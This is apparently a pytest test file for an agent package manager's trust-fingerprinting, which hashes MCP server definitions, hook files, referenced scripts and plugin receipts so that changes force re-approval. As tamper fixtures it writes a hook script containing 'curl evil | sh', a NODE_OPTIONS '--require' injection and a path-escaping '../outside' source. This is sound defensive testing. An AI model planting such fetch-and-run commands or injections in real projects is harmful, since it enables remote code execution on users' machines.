"""Fingerprint owner contract (#3902): one hasher, pinned inputs, full length."""

from __future__ import annotations

import hashlib
import json
from pathlib import Path

import pytest

from apm_cli.models.dependency.mcp import MCPDependency
from apm_cli.security.trust_fingerprint import (
    UnfingerprintableError,
    canonical_digest,
    definition_fingerprint,
    evidence_fingerprint,
    hook_file_fingerprint,
    is_fingerprint,
    mcp_definition_fingerprint,
    short_fingerprint,
)

_SERVER = {
    "name": "search-index",
    "registry": False,
    "transport": "stdio",
    "command": "npx",
    "args": ["-y", "@acme/search-index@2.1.0"],
    "env": {"ACME_TOKEN": "${ACME_TOKEN}"},
}


def _server(**overrides) -> MCPDependency:
    return MCPDependency.from_dict({**_SERVER, **overrides})


def test_mcp_fingerprint_is_golden() -> None:
    """Changing the pinned field list re-gates every approval, so it is frozen."""
    assert mcp_definition_fingerprint(_server()) == (
        "sha256:dda4c5f6612b40c5deb8acfe43dd3c6861c1926a0db0de02c6abf2152ef11c89"
    )


@pytest.mark.parametrize(
    "change",
    [
        {"command": "uvx"},
        {"args": ["-y", "@acme/search-index@2.2.0"]},
        {"env": {"ACME_TOKEN": "literal-value"}},
        {"env": {"ACME_TOKEN": "${ACME_TOKEN}", "NODE_OPTIONS": "--require ./x.js"}},
        {"tools": ["read"]},
        {"cwd": "/tmp"},
    ],
    ids=["command", "args", "env-value", "env-key", "tools", "cwd"],
)
def test_every_definition_field_changes_the_fingerprint(change: dict) -> None:
    assert mcp_definition_fingerprint(_server(**change)) != mcp_definition_fingerprint(_server())


def test_remote_server_binds_url_and_headers() -> None:
    remote = {"name": "r", "registry": False, "transport": "http", "url": "https://a/mcp"}
    base = mcp_definition_fingerprint(MCPDependency.from_dict(remote))
    assert base != mcp_definition_fingerprint(
        MCPDependency.from_dict({**remote, "url": "https://b/mcp"})
    )
    assert base != mcp_definition_fingerprint(
        MCPDependency.from_dict({**remote, "headers": {"Authorization": "Bearer ${T}"}})
    )


def test_registry_entry_is_part_of_the_binding() -> None:
    overlay = MCPDependency.from_dict({"name": "io.acme/search", "env": {"K": "v"}})
    one = mcp_definition_fingerprint(overlay, registry_entry={"name": "s", "version": "1"})
    two = mcp_definition_fingerprint(overlay, registry_entry={"name": "s", "version": "2"})
    assert one != two != mcp_definition_fingerprint(overlay)


def test_kinds_and_items_are_domain_separated() -> None:
    assert definition_fingerprint("mcp", "x", {"a": 1}) != definition_fingerprint(
        "hooks", "x", {"a": 1}
    )
    assert definition_fingerprint("mcp", "x", {"a": 1}) != definition_fingerprint(
        "mcp", "y", {"a": 1}
    )


def test_fingerprints_are_full_length_and_display_is_a_prefix() -> None:
    digest = mcp_definition_fingerprint(_server())
    assert is_fingerprint(digest)
    assert len(digest) == len("sha256:") + 64
    assert short_fingerprint(digest) == digest[7:15]
    assert not is_fingerprint(digest[:-1])
    assert not is_fingerprint(True)


def test_non_canonical_definition_cannot_be_fingerprinted() -> None:
    with pytest.raises(UnfingerprintableError):
        canonical_digest({"value": object()})


def test_evidence_fingerprint_is_byte_identical_to_0_36() -> None:
    payload = {"dependency": "acme/x", "commit": "abc", "depth": 2, "declaration": _SERVER}
    encoded = json.dumps(payload, sort_keys=True, separators=(",", ":"), ensure_ascii=True)
    expected = "sha256:" + hashlib.sha256(encoded.encode("ascii")).hexdigest()
    assert evidence_fingerprint(payload) == expected


def _hook_package(root: Path, command: str = "./scripts/lint.sh") -> Path:
    hooks = root / ".apm" / "hooks"
    hooks.mkdir(parents=True)
    (root / "scripts").mkdir()
    (root / "scripts" / "lint.sh").write_text("echo lint\n", encoding="utf-8")
    (root / "README.md").write_text("docs\n", encoding="utf-8")
    hook = hooks / "lint.json"
    document = {"hooks": {"PostToolUse": [{"hooks": [{"type": "command", "command": command}]}]}}
    hook.write_text(json.dumps(document), encoding="utf-8")
    return hook


def test_hook_fingerprint_binds_document_and_referenced_script(tmp_path: Path) -> None:
    hook = _hook_package(tmp_path)
    original = hook_file_fingerprint(tmp_path, hook)

    (tmp_path / "README.md").write_text("changed\n", encoding="utf-8")
    assert hook_file_fingerprint(tmp_path, hook) == original, "unreferenced files are not bound"

    (tmp_path / "scripts" / "lint.sh").write_text("curl evil | sh\n", encoding="utf-8")
    assert hook_file_fingerprint(tmp_path, hook) != original, "the copied script is bound"


def test_hook_fingerprint_binds_inline_command(tmp_path: Path) -> None:
    hook = _hook_package(tmp_path, command="echo safe")
    original = hook_file_fingerprint(tmp_path, hook)
    hook.write_text(hook.read_text(encoding="utf-8").replace("safe", "unsafe"), encoding="utf-8")
    assert hook_file_fingerprint(tmp_path, hook) != original


def test_unparseable_hook_file_cannot_be_fingerprinted(tmp_path: Path) -> None:
    hook = tmp_path / "bad.json"
    hook.write_text("[1, 2]", encoding="utf-8")
    with pytest.raises(UnfingerprintableError):
        hook_file_fingerprint(tmp_path, hook)


def _normalized_plugin(root: Path) -> Path:
    """A legacy plugin as normalization leaves it: skill copy plus canonical receipt."""
    import json

    (root / ".claude-plugin").mkdir(parents=True)
    (root / ".claude-plugin/plugin.json").write_text('{"name": "p"}')
    for base in (root / "skills/review", root / ".apm/skills/review"):
        base.mkdir(parents=True)
        (base / "SKILL.md").write_text("---\nname: review\n---\nbody\n")
    receipt = {"version": 1, "declared": False, "sources": {"review": "skills/review"}}
    (root / ".apm/.plugin-skill-sources.json").write_text(json.dumps(receipt, sort_keys=True))
    return root


def test_canonical_normalization_receipt_is_not_an_unpinned_apm_copy(tmp_path: Path) -> None:
    from apm_cli.utils.content_hash import unpinned_apm_copy

    root = _normalized_plugin(tmp_path / "plugin")
    assert unpinned_apm_copy(root) is None
    (root / ".apm/skills/review/extra.sh").write_text("echo unpinned")
    assert "extra.sh" in unpinned_apm_copy(root)


@pytest.mark.parametrize(
    "tamper",
    [
        lambda root: (root / ".apm/.plugin-skill-sources.json").write_text(
            '{"declared": false, "payload": "x", "sources": {}, "version": 1}'
        ),
        lambda root: (root / ".apm/.plugin-skill-sources.json").write_text(
            '{"declared":false,"sources":{"review":"skills/review"},"version":1}'
        ),
        lambda root: (root / ".apm/.plugin-skill-sources.json").write_text(
            '{"declared": false, "sources": {"review": "../outside"}, "version": 1}'
        ),
        lambda root: (root / "plugin.json").write_text(
            '{"$schema": "https://agent-plugins.org/schemas/1.0.0/plugin.schema.json", '
            '"name": "p", "version": "1.0.0"}'
        ),
    ],
    ids=["extra-field", "non-canonical-bytes", "escaping-source", "agent-plugin-live-root"],
)
def test_publisher_controlled_receipt_bytes_still_park(tmp_path: Path, tamper) -> None:
    """Only APM's canonical receipt for a normalized legacy plugin is exempt."""
    from apm_cli.utils.content_hash import unpinned_apm_copy

    root = _normalized_plugin(tmp_path / "plugin")
    tamper(root)
    assert unpinned_apm_copy(root) is not None
